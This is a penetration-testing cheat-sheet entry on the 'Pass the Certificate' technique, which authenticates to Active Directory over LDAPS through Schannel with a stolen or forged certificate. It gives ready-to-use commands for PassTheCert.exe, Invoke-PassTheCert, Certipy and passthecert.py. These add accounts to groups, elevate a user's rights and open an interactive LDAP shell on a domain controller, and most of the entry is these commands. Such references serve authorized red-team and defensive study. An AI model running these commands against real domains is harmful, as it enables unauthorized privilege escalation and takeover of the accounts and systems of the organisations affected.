---
technique: Pass the Certificate (Schannel)
category: schannel
targets: LDAP, Domain Controllers
protocols: LDAPS, Schannel, TLS
remote_capable: true
tags: schannel certificate ldap pkinit adcs tls auth
---

# Pass the Certificate (Schannel)

When domain controllers lack the `Smart Card Logon` EKU and cannot process PKINIT, Schannel (TLS client authentication) can be used instead. Authenticating to LDAP(S) via Schannel bypasses both channel binding and LDAP signing because the bind occurs after StartTLS. A certificate for any principal can thus be used to perform LDAP operations as that principal.

## Windows

PassTheCert (C#) and Invoke-PassTheCert (PowerShell) both authenticate via Schannel to perform LDAP operations.

### PassTheCert.exe

#csharp #ldaps #certificate

Add a user to a group over LDAPS by authenticating with a certificate via Schannel.

```powershell title:"Add account to group over LDAPS using PassTheCert"
.\PassTheCert.exe --server "$dc_fqdn" --cert-path cert.pfx --add-account-to-group --target "$target_group_dn" --account "$target_user_dn"
```
<!-- cheat
import domain_ip
var dc_fqdn
var target_group_dn
var target_user_dn
-->

### Step 1: Import Invoke-PassTheCert

#powershell #ldaps #certificate

Import the Invoke-PassTheCert PowerShell module.

```powershell title:"Import Invoke-PassTheCert module"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Step 2: Get LDAP connection (Invoke-PassTheCert)

#powershell #ldaps #certificate

Authenticate to LDAPS via Schannel with a certificate.

```powershell title:"Create Schannel LDAPS connection with Invoke-PassTheCert"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate cert.pfx
```
<!-- cheat
import domain_ip
-->

### Step 3: Add group member (Invoke-PassTheCert)

#powershell #ldaps #certificate

Add a group member over the certificate-authenticated LDAPS connection.

```powershell title:"Add group member over Schannel LDAPS"
Invoke-PassTheCert -Action AddGroupMember -LdapConnection $ldap -Identity "$target_user_dn" -GroupDN "$target_group_dn"
```
<!-- cheat
var target_user_dn
var target_group_dn
var ldap
-->

## Linux

Certipy extracts key and cert from a PFX; passthecert.py then uses them to act over LDAP via Schannel.

### Step 1: Extract certificate from PFX (certipy)

#python #certificate #prep

Extract the certificate (without key) from a PFX file for use with passthecert.py.

```sh title:"Extract certificate from PFX with Certipy"
certipy cert -pfx user.pfx -nokey -out user.crt
```
<!-- cheat -->

### Step 2: Extract private key from PFX (certipy)

#python #certificate #prep

Extract the private key (without cert) from a PFX file for use with passthecert.py.

```sh title:"Extract private key from PFX with Certipy"
certipy cert -pfx user.pfx -nocert -out user.key
```
<!-- cheat -->

### passthecert (elevate user)

#python #ldap #certificate

Elevate a user account over LDAP by authenticating via Schannel with a certificate.

```sh title:"Elevate user via Schannel LDAP authentication with passthecert"
passthecert.py -action modify_user -crt user.crt -key user.key -domain "$domain" -dc-ip "$rhost_ip" -target "$target_user" -elevate
```
<!-- cheat
import domain_ip
var target_user
-->

### passthecert (ldap-shell)

#python #ldap #shell #certificate

Spawn an interactive LDAP shell authenticated via Schannel using a certificate.

```sh title:"Open interactive LDAP shell via Schannel with passthecert"
passthecert.py -action ldap-shell -crt user.crt -key user.key -domain "$domain" -dc-ip "$rhost_ip"
```
<!-- cheat
import domain_ip
var dc_ip
-->
